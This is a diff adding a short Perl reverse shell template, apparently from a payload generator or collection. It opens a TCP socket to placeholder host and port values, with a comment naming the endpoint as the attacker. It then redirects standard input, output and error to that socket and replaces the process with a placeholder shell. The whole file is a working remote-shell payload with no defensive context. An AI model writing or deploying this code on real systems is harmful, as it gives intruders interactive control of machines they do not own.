@@ -1,0 +1,13 @@
+use Socket;
+
+# Open a new socket and connect to the attacker
+socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
+connect(S, sockaddr_in(*\port*, inet_aton("*\host*")))
+
+# Redirect STDIN, STDOUT, and STDERR to the socket
+open(STDIN,  ">&S");
+open(STDOUT, ">&S");
+open(STDERR, ">&S");
+
+# Replace the current process with the shell
+exec("*\shell*");
